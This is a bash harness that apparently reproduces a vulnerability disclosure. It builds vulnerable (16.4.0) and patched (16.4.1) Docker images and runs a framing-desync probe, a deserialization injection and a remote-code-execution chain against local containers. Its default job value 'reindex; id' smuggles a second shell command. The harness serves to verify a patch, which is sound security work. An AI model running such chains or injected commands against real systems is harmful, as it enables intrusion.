#!/usr/bin/env bash
# One-command reproduction: build both images, start them, run every step.
set -uo pipefail
cd "$(dirname "$0")"

VULN=http://127.0.0.1:3000
PATCHED=http://127.0.0.1:3001
JOB="${1:-reindex; id}"

echo "### 1/4  building images (vulnerable 16.4.0 / patched 16.4.1)"
docker compose build 2>&1 | tail -3

echo
echo "### 2/4  starting containers"
docker compose up -d 2>&1 | tail -2
for _ in $(seq 1 60); do
  healthy=$(docker compose ps --format json 2>/dev/null | grep -c '"Health":"healthy"')
  [ "$healthy" = "2" ] && { echo "both containers healthy"; break; }
  sleep 2
done

echo
echo "### 3/4  framing desync"
node exploit/probe.mjs "$VULN" "$PATCHED"

echo
echo "### 4/4  controlled deserialization + full chain"
echo "--- vulnerable target ---"
node exploit/inject.mjs "$VULN"
node exploit/rce.mjs "$VULN" "$JOB"

echo
echo "--- patched target ---"
node exploit/inject.mjs "$PATCHED"
node exploit/rce.mjs "$PATCHED" "$JOB"

echo
echo "Done."
